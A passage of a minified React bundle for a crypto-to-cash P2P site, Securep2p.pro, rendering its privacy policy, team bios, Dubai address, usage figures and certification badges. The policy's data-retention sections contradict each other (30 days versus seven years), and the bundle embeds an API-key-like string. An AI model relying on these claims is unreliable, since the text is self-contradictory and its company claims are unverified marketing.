                                }), a.jsx("li", {
                                    children: "• Error logs and debugging data"
                                })]
                            })]
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "Blockchain Records:"
                        }), " Please note that blockchain transactions are permanent and cannot be deleted. However, these records do not contain your personal information, only wallet addresses and transaction amounts."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "7. No Tracking Policy"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Unlike most websites, Securep2p.pro does not engage in user tracking:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "No Google Analytics:"
                            }), " We don't use Google Analytics or similar tracking services"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "No Social Media Pixels:"
                            }), " No Facebook, Twitter, or other social media tracking"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "No Advertising Networks:"
                            }), " No third-party advertising or retargeting"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "No Cross-Site Tracking:"
                            }), " We don't track your activity across other websites"]
                        }), a.jsxs("li", {
                            children: ["• ", a.jsx("strong", {
                                children: "Minimal Cookies:"
                            }), " Only essential cookies for platform functionality"]
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We use privacy-focused analytics that collect only anonymized, aggregated data to improve platform performance."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "8. Data Retention"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We retain information only as long as necessary for legitimate business purposes:"
                    }), a.jsxs("div", {
                        className: "space-y-3",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Transaction Data:"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Basic transaction records: 30 days for support purposes, then automatically deleted"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Payment Information:"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Deleted immediately after successful fund transfer completion"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Technical Logs:"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Anonymized logs kept for 90 days for security and performance monitoring"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Support Communications:"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Kept for 1 year to maintain support quality, then automatically deleted"
                            })]
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "5. Data Retention"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We retain your information for as long as necessary to provide our services and comply with legal obligations:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Transaction records: 7 years (regulatory requirement)"
                        }), a.jsx("li", {
                            children: "• KYC documents: 5 years after account closure"
                        }), a.jsx("li", {
                            children: "• Technical logs: 2 years"
                        }), a.jsx("li", {
                            children: "• Marketing preferences: Until you opt out"
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "9. Your Privacy Rights"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "You have comprehensive rights regarding your personal information, regardless of your location:"
                    }), a.jsxs("div", {
                        className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-4",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Access & Portability"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Request a copy of all data we have about you in a machine-readable format"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Correction"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Update or correct any inaccurate information we may have"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Deletion"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Request immediate deletion of all your personal data"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Processing Restriction"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Request restriction of processing for specific purposes"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Objection"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Object to processing based on legitimate interests"
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${t.text} mb-2`,
                                children: "Withdraw Consent"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Withdraw consent for any processing based on consent"
                            })]
                        })]
                    }), a.jsxs("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: [a.jsx("strong", {
                            children: "How to Exercise Your Rights:"
                        }), " Contact us at privacy@Securep2p.pro with your request. We will respond within 48 hours and fulfill valid requests within 30 days at no cost to you."]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "10. Cookies and Local Storage"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro uses minimal cookies and local storage for essential functionality only:"
                    }), a.jsxs("div", {
                        className: "space-y-3",
                        children: [a.jsxs("div", {
                            className: `${e ? "bg-green-900/20" : "bg-green-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-green-300" : "text-green-800"} mb-2`,
                                children: "Essential Cookies (Required)"
                            }), a.jsxs("ul", {
                                className: `text-sm ${e ? "text-green-400" : "text-green-700"} space-y-1 ml-4`,
                                children: [a.jsx("li", {
                                    children: "• Session management and security"
                                }), a.jsx("li", {
                                    children: "• Theme preferences (dark/light mode)"
                                }), a.jsx("li", {
                                    children: "• Language selection"
                                }), a.jsx("li", {
                                    children: "• Wallet connection state"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: `${e ? "bg-red-900/20" : "bg-red-50"} rounded-xl p-4`,
                            children: [a.jsx("h4", {
                                className: `font-semibold ${e ? "text-red-300" : "text-red-800"} mb-2`,
                                children: "What We DON'T Use"
                            }), a.jsxs("ul", {
                                className: `text-sm ${e ? "text-red-400" : "text-red-700"} space-y-1 ml-4`,
                                children: [a.jsx("li", {
                                    children: "• Advertising or marketing cookies"
                                }), a.jsx("li", {
                                    children: "• Social media tracking pixels"
                                }), a.jsx("li", {
                                    children: "• Cross-site tracking cookies"
                                }), a.jsx("li", {
                                    children: "• Third-party analytics cookies"
                                }), a.jsx("li", {
                                    children: "• Behavioral profiling cookies"
                                })]
                            })]
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "You can disable cookies in your browser settings, but this may affect platform functionality."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsxs("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                        children: [a.jsx(Me, {
                            className: "w-5 h-5 mr-2 text-blue-600"
                        }), "11. International Data Transfers"]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro operates globally with distributed infrastructure. Your data may be processed in different countries, but we ensure:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• All data transfers use encryption and secure protocols"
                        }), a.jsx("li", {
                            children: "• We only work with jurisdictions that provide adequate data protection"
                        }), a.jsx("li", {
                            children: "• Standard contractual clauses are used for international transfers"
                        }), a.jsx("li", {
                            children: "• Data localization preferences are respected where possible"
                        }), a.jsx("li", {
                            children: "• No data is transferred to countries with poor privacy records"
                        })]
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "12. Children's Privacy"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Securep2p.pro is not intended for use by individuals under 18 years of age. We do not knowingly collect personal information from children under 18. If we become aware that we have collected personal information from a child under 18, we will take immediate steps to delete such information."
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "If you are a parent or guardian and believe your child has provided us with personal information, please contact us immediately at privacy@Securep2p.pro."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "13. Data Breach Notification"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "In the unlikely event of a data breach that affects your personal information, we commit to:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Detect and contain the breach within 1 hour"
                        }), a.jsx("li", {
                            children: "• Assess the scope and impact within 6 hours"
                        }), a.jsx("li", {
                            children: "• Notify affected users within 24 hours"
                        }), a.jsx("li", {
                            children: "• Provide clear information about what happened and what we're doing"
                        }), a.jsx("li", {
                            children: "• Offer free credit monitoring if financial data was involved"
                        }), a.jsx("li", {
                            children: "• Implement additional security measures to prevent recurrence"
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "Our minimal data collection approach significantly reduces the risk and impact of potential breaches."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "14. Policy Updates"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We may update this Privacy Policy periodically to reflect changes in our practices or legal requirements. Material changes will be communicated through:"
                    }), a.jsxs("ul", {
                        className: `${t.textSecondary} mb-4 space-y-2 ml-6`,
                        children: [a.jsx("li", {
                            children: "• Prominent notice on our platform"
                        }), a.jsx("li", {
                            children: "• Email notification if you've provided contact information"
                        }), a.jsx("li", {
                            children: "• 30-day advance notice for significant changes"
                        }), a.jsx("li", {
                            children: '• Updated "Last updated" date at the top of this policy'
                        })]
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "We encourage you to review this policy periodically to stay informed about how we protect your privacy."
                    })]
                }), a.jsxs("section", {
                    children: [a.jsx("h3", {
                        className: `text-xl font-semibold ${t.text} mb-4`,
                        children: "15. Contact Us"
                    }), a.jsx("p", {
                        className: `${t.textSecondary} mb-4 leading-relaxed`,
                        children: "For questions, concerns, or requests regarding this Privacy Policy or our data practices:"
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                        children: [a.jsx("p", {
                            className: `${t.text} font-medium`,
                            children: "Securep2p.pro Privacy Team"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Email: privacy@Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "General Support: support@Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Website: https://Securep2p.pro"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Privacy Requests: Responded to within 48 hours"
                        }), a.jsx("p", {
                            className: `${t.textSecondary} text-sm`,
                            children: "Data Deletion: Processed within 24 hours"
                        })]
                    }), a.jsx("div", {
                        className: `mt-4 ${e ? "bg-blue-900/20" : "bg-blue-50"} border ${e ? "border-blue-800" : "border-blue-200"} rounded-xl p-4`,
                        children: a.jsxs("p", {
                            className: `text-sm ${e ? "text-blue-300" : "text-blue-800"}`,
                            children: [a.jsx("strong", {
                                children: "Data Protection Officer:"
                            }), " For complex privacy matters or regulatory inquiries, contact our Data Protection Officer at dpo@Securep2p.pro"]
                        })
                    }), a.jsx("div", {
                        className: `mt-4 ${e ? "bg-green-900/20" : "bg-green-50"} border ${e ? "border-green-800" : "border-green-200"} rounded-xl p-4`,
                        children: a.jsxs("p", {
                            className: `text-sm ${e ? "text-green-300" : "text-green-800"}`,
                            children: [a.jsx("strong", {
                                children: "Effective Date:"
                            }), " This Privacy Policy is effective as of January 1, 2025, and supersedes all previous versions."]
                        })
                    })]
                })]
            })
        })]
    })
})
  , Hf = ({darkMode: e, themeClasses: t, onClose: n}) => {
    const r = [{
        name: "Sarah Chen",
        role: "Chief Executive Officer",
        experience: "Former Goldman Sachs VP, 12+ years in fintech",
        expertise: "Strategic Leadership, Financial Markets"
    }, {
        name: "Marcus Rodriguez",
        role: "Chief Technology Officer",
        experience: "Ex-Coinbase Senior Engineer, Blockchain expert",
        expertise: "Blockchain Architecture, Smart Contracts"
    }, {
        name: "Priya Sharma",
        role: "Head of Operations",
        experience: "Former Binance Operations Manager, 8+ years",
        expertise: "Global Operations, Compliance"
    }, {
        name: "David Kim",
        role: "Head of Security",
        experience: "Ex-Kraken Security Lead, Cybersecurity expert",
        expertise: "Platform Security, Risk Management"
    }, {
        name: "Elena Volkov",
        role: "Head of Customer Success",
        experience: "Former Revolut Customer Experience Lead",
        expertise: "Customer Relations, Support Operations"
    }, {
        name: "Ahmed Al-Rashid",
        role: "Regional Director - MENA",
        experience: "Local market expert, 10+ years in UAE fintech",
        expertise: "Regional Partnerships, Regulatory Compliance"
    }];
    return a.jsx("div", {
        className: "fixed inset-0 bg-black/50 backdrop-blur-sm z-[9999] flex items-center justify-center p-4",
        children: a.jsxs("div", {
            className: `${t.cardBg} rounded-3xl shadow-2xl max-w-6xl w-full max-h-[90vh] overflow-hidden border-2 ${e ? "border-blue-800" : "border-blue-200"}`,
            children: [a.jsxs("div", {
                className: `bg-gradient-to-r ${e ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} p-6 border-b ${t.border} relative`,
                children: [a.jsx("button", {
                    onClick: n,
                    className: `absolute top-4 right-4 p-2 rounded-full ${t.hover} transition-colors`,
                    children: a.jsx(fs, {
                        className: `w-5 h-5 ${t.textSecondary}`
                    })
                }), a.jsxs("div", {
                    className: "flex items-center space-x-3",
                    children: [a.jsx("div", {
                        className: `w-12 h-12 bg-gradient-to-r ${t.gradient} rounded-2xl flex items-center justify-center shadow-lg`,
                        children: a.jsx(of, {
                            className: "w-6 h-6 text-white"
                        })
                    }), a.jsxs("div", {
                        children: [a.jsx("h2", {
                            className: `text-2xl font-bold ${t.text}`,
                            children: "securep2p.pro"
                        }), a.jsx("p", {
                            className: `text-sm ${t.textSecondary}`,
                            children: "Secure • Fast • Trusted"
                        })]
                    })]
                })]
            }), a.jsxs("div", {
                className: "p-6 overflow-y-auto max-h-[calc(90vh-120px)]",
                children: [a.jsxs("div", {
                    className: "grid lg:grid-cols-2 gap-8",
                    children: [a.jsxs("div", {
                        className: "space-y-6",
                        children: [a.jsxs("section", {
                            children: [a.jsxs("h3", {
                                className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                                children: [a.jsx(xa, {
                                    className: "w-5 h-5 mr-2 text-blue-600"
                                }), "Contact Information"]
                            }), a.jsx("div", {
                                className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4 mb-4`,
                                children: a.jsxs("div", {
                                    className: "flex items-start space-x-3",
                                    children: [a.jsx(mf, {
                                        className: "w-5 h-5 text-blue-600 mt-1 flex-shrink-0"
                                    }), a.jsxs("div", {
                                        children: [a.jsx("h4", {
                                            className: `font-semibold ${t.text} mb-2`,
                                            children: "Dubai Headquarters"
                                        }), a.jsxs("p", {
                                            className: `text-sm ${t.textSecondary} leading-relaxed`,
                                            children: ["W505, Al Sahaa Offices, Lobby C, Level 5", a.jsx("br", {}), "Downtown Burj Khalifa", a.jsx("br", {}), "Dubai - United Arab Emirates"]
                                        })]
                                    })]
                                })
                            }), a.jsxs("div", {
                                className: "space-y-3",
                                children: [a.jsx("div", {
                                    className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                                    children: a.jsxs("div", {
                                        className: "flex items-center space-x-3",
                                        children: [a.jsx(xa, {
                                            className: "w-5 h-5 text-green-600"
                                        }), a.jsxs("div", {
                                            children: [a.jsx("h4", {
                                                className: `font-semibold ${t.text}`,
                                                children: "Email Support"
                                            }), a.jsx("p", {
                                                className: `text-sm ${t.textSecondary}`,
                                                children: "support@securep2p.pro"
                                            }), a.jsx("p", {
                                                className: `text-xs ${t.textSecondary}`,
                                                children: "Response time: Within 2 hours"
                                            })]
                                        })]
                                    })
                                }), a.jsx("div", {
                                    className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                                    children: a.jsxs("div", {
                                        className: "flex items-center space-x-3",
                                        children: [a.jsx(br, {
                                            className: "w-5 h-5 text-blue-600"
                                        }), a.jsxs("div", {
                                            children: [a.jsx("h4", {
                                                className: `font-semibold ${t.text}`,
                                                children: "Live Chat Support"
                                            }), a.jsxs("p", {
                                                className: `text-sm ${t.textSecondary}`,
                                                children: ["Our support team is available ", a.jsx("span", {
                                                    className: "font-medium",
                                                    children: "24/7"
                                                }), "."]
                                            }), a.jsx("p", {
                                                className: `text-xs ${t.textSecondary}`,
                                                children: "Please reach us through the Live Chat option on this page."
                                            })]
                                        })]
                                    })
                                }), a.jsx("div", {
                                    className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                                    children: a.jsxs("div", {
                                        className: "flex items-center space-x-3",
                                        children: [a.jsx(im, {
                                            className: "w-5 h-5 text-purple-600"
                                        }), a.jsxs("div", {
                                            children: [a.jsx("h4", {
                                                className: `font-semibold ${t.text}`,
                                                children: "Business Hours"
                                            }), a.jsx("p", {
                                                className: `text-sm ${t.textSecondary}`,
                                                children: "24/7 Online Support"
                                            })]
                                        })]
                                    })
                                })]
                            })]
                        }), a.jsxs("section", {
                            children: [a.jsxs("h3", {
                                className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                                children: [a.jsx(yc, {
                                    className: "w-5 h-5 mr-2 text-blue-600"
                                }), "Company Overview"]
                            }), a.jsxs("div", {
                                className: "grid grid-cols-2 gap-4 mb-4",
                                children: [a.jsxs("div", {
                                    className: `${e ? "bg-blue-900/20" : "bg-blue-50"} rounded-xl p-4 text-center`,
                                    children: [a.jsx("div", {
                                        className: `text-2xl font-bold ${e ? "text-blue-300" : "text-blue-800"}`,
                                        children: "2021"
                                    }), a.jsx("div", {
                                        className: `text-sm ${t.textSecondary}`,
                                        children: "Founded"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-green-900/20" : "bg-green-50"} rounded-xl p-4 text-center`,
                                    children: [a.jsx("div", {
                                        className: `text-2xl font-bold ${e ? "text-green-300" : "text-green-800"}`,
                                        children: "50+"
                                    }), a.jsx("div", {
                                        className: `text-sm ${t.textSecondary}`,
                                        children: "Team Members"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-purple-900/20" : "bg-purple-50"} rounded-xl p-4 text-center`,
                                    children: [a.jsx("div", {
                                        className: `text-2xl font-bold ${e ? "text-purple-300" : "text-purple-800"}`,
                                        children: "120K+"
                                    }), a.jsx("div", {
                                        className: `text-sm ${t.textSecondary}`,
                                        children: "Active Users"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-orange-900/20" : "bg-orange-50"} rounded-xl p-4 text-center`,
                                    children: [a.jsx("div", {
                                        className: `text-2xl font-bold ${e ? "text-orange-300" : "text-orange-800"}`,
                                        children: "$847M+"
                                    }), a.jsx("div", {
                                        className: `text-sm ${t.textSecondary}`,
                                        children: "Volume Processed"
                                    })]
                                })]
                            }), a.jsxs("div", {
                                className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                                children: [a.jsx("h4", {
                                    className: `font-semibold ${t.text} mb-2`,
                                    children: "Mission Statement"
                                }), a.jsx("p", {
                                    className: `text-sm ${t.textSecondary} leading-relaxed`,
                                    children: "securep2p.pro is dedicated to democratizing access to cryptocurrency liquidity while maintaining the highest standards of security and privacy. We believe in financial freedom without compromising user privacy or security."
                                })]
                            })]
                        })]
                    }), a.jsxs("div", {
                        className: "space-y-6",
                        children: [a.jsxs("section", {
                            children: [a.jsxs("h3", {
                                className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                                children: [a.jsx(ps, {
                                    className: "w-5 h-5 mr-2 text-blue-600"
                                }), "Leadership Team"]
                            }), a.jsx("div", {
                                className: "mb-6",
                                children: a.jsxs("div", {
                                    className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4 text-center`,
                                    children: [a.jsx("img", {
                                        src: "https://i.ibb.co/7N2rSt5Y/Dubai-10-X-teams-meeting-2.jpg",
                                        alt: "securep2p.pro Team",
                                        className: "w-full h-48 object-cover rounded-lg mb-3"
                                    }), a.jsx("p", {
                                        className: `text-sm ${t.textSecondary}`,
                                        children: "Our diverse team of experts from leading fintech companies"
                                    })]
                                })
                            }), a.jsx("div", {
                                className: "space-y-4",
                                children: r.map( (s, i) => a.jsx("div", {
                                    className: `${e ? "bg-gray-800/50" : "bg-gray-50"} rounded-xl p-4`,
                                    children: a.jsxs("div", {
                                        className: "flex items-start space-x-3",
                                        children: [a.jsx("div", {
                                            className: `w-12 h-12 bg-gradient-to-r ${t.gradient} rounded-xl flex items-center justify-center text-white font-bold shadow-lg flex-shrink-0`,
                                            children: s.name.split(" ").map(o => o[0]).join("")
                                        }), a.jsxs("div", {
                                            className: "flex-1",
                                            children: [a.jsx("h4", {
                                                className: `font-semibold ${t.text}`,
                                                children: s.name
                                            }), a.jsx("p", {
                                                className: "text-sm text-blue-600 font-medium",
                                                children: s.role
                                            }), a.jsx("p", {
                                                className: `text-xs ${t.textSecondary} mt-1`,
                                                children: s.experience
                                            }), a.jsxs("p", {
                                                className: `text-xs ${t.textSecondary} mt-1`,
                                                children: [a.jsx("strong", {
                                                    children: "Expertise:"
                                                }), " ", s.expertise]
                                            })]
                                        })]
                                    })
                                }, i))
                            })]
                        }), a.jsxs("section", {
                            children: [a.jsxs("h3", {
                                className: `text-xl font-semibold ${t.text} mb-4 flex items-center`,
                                children: [a.jsx(Fn, {
                                    className: "w-5 h-5 mr-2 text-blue-600"
                                }), "Certifications & Compliance"]
                            }), a.jsxs("div", {
                                className: "grid grid-cols-2 gap-3",
                                children: [a.jsxs("div", {
                                    className: `${e ? "bg-green-900/20" : "bg-green-50"} rounded-xl p-3 text-center border ${e ? "border-green-800" : "border-green-200"}`,
                                    children: [a.jsx(Fn, {
                                        className: "w-6 h-6 text-green-600 mx-auto mb-2"
                                    }), a.jsx("div", {
                                        className: `text-sm font-medium ${e ? "text-green-300" : "text-green-800"}`,
                                        children: "ISO 27001"
                                    }), a.jsx("div", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: "Security Management"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-blue-900/20" : "bg-blue-50"} rounded-xl p-3 text-center border ${e ? "border-blue-800" : "border-blue-200"}`,
                                    children: [a.jsx(yc, {
                                        className: "w-6 h-6 text-blue-600 mx-auto mb-2"
                                    }), a.jsx("div", {
                                        className: `text-sm font-medium ${e ? "text-blue-300" : "text-blue-800"}`,
                                        children: "SOC 2 Type II"
                                    }), a.jsx("div", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: "Data Protection"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-purple-900/20" : "bg-purple-50"} rounded-xl p-3 text-center border ${e ? "border-purple-800" : "border-purple-200"}`,
                                    children: [a.jsx(Me, {
                                        className: "w-6 h-6 text-purple-600 mx-auto mb-2"
                                    }), a.jsx("div", {
                                        className: `text-sm font-medium ${e ? "text-purple-300" : "text-purple-800"}`,
                                        children: "GDPR Compliant"
                                    }), a.jsx("div", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: "Privacy Protection"
                                    })]
                                }), a.jsxs("div", {
                                    className: `${e ? "bg-orange-900/20" : "bg-orange-50"} rounded-xl p-3 text-center border ${e ? "border-orange-800" : "border-orange-200"}`,
                                    children: [a.jsx(Ot, {
                                        className: "w-6 h-6 text-orange-600 mx-auto mb-2"
                                    }), a.jsx("div", {
                                        className: `text-sm font-medium ${e ? "text-orange-300" : "text-orange-800"}`,
                                        children: "CertiK Audited"
                                    }), a.jsx("div", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: "Smart Contract Security"
                                    })]
                                })]
                            })]
                        })]
                    })]
                }), a.jsxs("div", {
                    className: `mt-8 bg-gradient-to-r ${e ? "from-blue-900/20 to-purple-900/20" : "from-blue-50 to-purple-50"} rounded-xl p-6 border ${e ? "border-blue-800" : "border-blue-200"} text-center`,
                    children: [a.jsx("h4", {
                        className: `text-lg font-semibold ${t.text} mb-2`,
                        children: "Ready to Get Started?"
                    }), a.jsx("p", {
                        className: `text-sm ${t.textSecondary} mb-4`,
                        children: "Join thousands of users who trust securep2p.pro for their crypto-to-cash needs"
                    }), a.jsxs("div", {
                        className: "flex flex-col sm:flex-row gap-3 justify-center",
                        children: [a.jsx("a", {
                            href: "mailto:support@securep2p.pro",
                            className: "bg-gradient-to-r from-blue-600 to-purple-600 text-white px-6 py-3 rounded-xl font-semibold hover:shadow-xl transition-all duration-300",
                            children: "Contact Support"
                        }), a.jsx("button", {
                            onClick: n,
                            className: `border-2 ${t.border} ${t.text} px-6 py-3 rounded-xl font-semibold ${t.hover} transition-all duration-300`,
                            children: "Start Trading"
                        })]
                    })]
                })]
            })]
        })
    })
}
  , Gf = "cqt_rQj9pWHk7jrKrDJPYByfhmRpCDCW";
function qf() {
    const [e,t] = E.useState( () => {
        const V = localStorage.getItem("theme");
        return V ? V === "dark" : typeof window < "u" && window.matchMedia ? window.matchMedia("(prefers-color-scheme: dark)").matches : !0
    }
    )
      , [n,r] = E.useState(!1)
      , [s,i] = E.useState("")
      , [o,l] = E.useState([])
      , [u,c] = E.useState(!1)
      , [m,h] = E.useState("")
      , [x,y] = E.useState("")
      , [v,k] = E.useState(1)
      , [p,f] = E.useState("")
      , [d,g] = E.useState("usd")
      , [S,w] = E.useState([])
      , [j,B] = E.useState(null)
      , [b,N] = E.useState("")
      , [P,M] = E.useState(null)
      , [U,D] = E.useState("")
      , [A,O] = E.useState("")
      , [W,F] = E.useState("")
      , [T,$] = E.useState({})
      , [z,L] = E.useState(!0)
      , [G,Q] = E.useState(!1)
      , [xe,Oe] = E.useState("")
      , [Ae,Vt] = E.useState(null)
      , [Yo,gs] = E.useState(!1)
      , [Jo,Qo] = E.useState(null)
      , [bm] = E.useState(mm(Sf, 4))
      , [Nm,Zo] = E.useState(!1)
      , [km,Xo] = E.useState(!1)
      , [jm,el] = E.useState(!1)
      , [Bm,tl] = E.useState(!1)
      , [ys,Tm] = E.useState(!1);
    E.useEffect( () => {
        const V = () => {
            Tm(window.innerWidth <= 768)
        }
        ;
        return V(),
        window.addEventListener("resize", V),
        () => window.removeEventListener("resize", V)
    }
    , []),
    E.useEffect( () => {
        if (typeof window < "u" && window.matchMedia) {
            const V = window.matchMedia("(prefers-color-scheme: dark)")
              , J = ge => {
                localStorage.getItem("theme") || t(ge.matches)
            }
            ;
            return V.addEventListener ? V.addEventListener("change", J) : V.addListener(J),
            () => {
                V.removeEventListener ? V.removeEventListener("change", J) : V.removeListener(J)
            }
        }
    }
    , []),
    E.useEffect( () => {
        localStorage.setItem("theme", e ? "dark" : "light")
    }
    , [e]);
    const I = {
        bg: e ? "bg-[#0a0b0d]" : "bg-gray-50",
        cardBg: e ? "bg-[#1a1b23]" : "bg-white",
        text: e ? "text-white" : "text-gray-900",
        textSecondary: e ? "text-gray-400" : "text-gray-600",
        border: e ? "border-gray-800" : "border-gray-200",
        hover: e ? "hover:bg-[#252730]" : "hover:bg-gray-50",
        input: e ? "bg-[#252730] border-gray-700 text-white" : "bg-white border-gray-300 text-gray-900",
